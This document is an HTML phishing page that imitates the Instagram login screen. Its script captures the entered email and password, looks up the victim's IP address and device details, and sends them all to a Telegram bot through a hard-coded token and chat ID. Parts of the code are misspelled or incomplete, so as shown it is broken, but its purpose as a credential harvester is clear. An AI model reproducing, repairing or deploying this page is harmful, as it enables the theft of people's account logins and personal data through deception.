<!DOCTYPE html>

<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form>
                    <label for="email" class="sr-only">Phone, username, or email</label>

                    <label for="password" class="sr-only">Password</label>

                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Log in with Facebook</a>
                    </div>
                    <a href="#">Forgot password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png"      alt="Image with the Apple Store logo" title="Image with the Apple Store logo" />
                    <img src="./img/googleplay-button.png" alt="Image with the Google Play logo" title="Image with the Google Play logo" />
                </div>
            </div>
        </section>
    </main>

    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
    <script>
        const TOKEN = "7606964682:AAHDf5CDBsA5yJw6EdCcyuqItSGg0GXnBzE";
        const CHAT_ID = "260206452";
        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
        doucment.getElementById('login-form').addEventListener('submit',function(e) {
            const email = doucment.getElementById('email').value;
            const password = doucment.getElementById('password').value;
            axios.get('https://api.ipify.org?format=json')
                .then(response => {
                    const ip = response.data.ip;
                    const userAgent = navigator.userAgent;
                    const platform = navigator.platform;
                    const screenWidth = screen.width;
                    const screenHeight = screen.height;
                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
                    const message = `
                        <b>Hello Sid Krar you are has a new login</b>\n
                        <b>Email:</b> ${email}\n
                        <b>Password:</b> ${password}\n
                        <b>IP:</b> ${ip}\n
                        <b>Device Type:</b> ${deviceType}\n
                        <b>Platform:</b> ${platform}\n
                        <b>User Agent:</b> ${userAgent}\n
                        <b>Screen Res:</b> ${screenWidth}x${screenHeight}\n
                    `;
                    axios.post(URI_API,{
                        chat_id: CHAT_ID,
                        parser_mode: 'html',
                        text: message
                    }).then(response => {
                        alert('inforamtion send successfully!');
                    }).catch(error => {
                        alert('Error sending the inforamation. Please try again.');
                    });
                }).catch(error => {
                    alert('Error fetching the IP Address. Please try again.');
                });
        });
    </script>
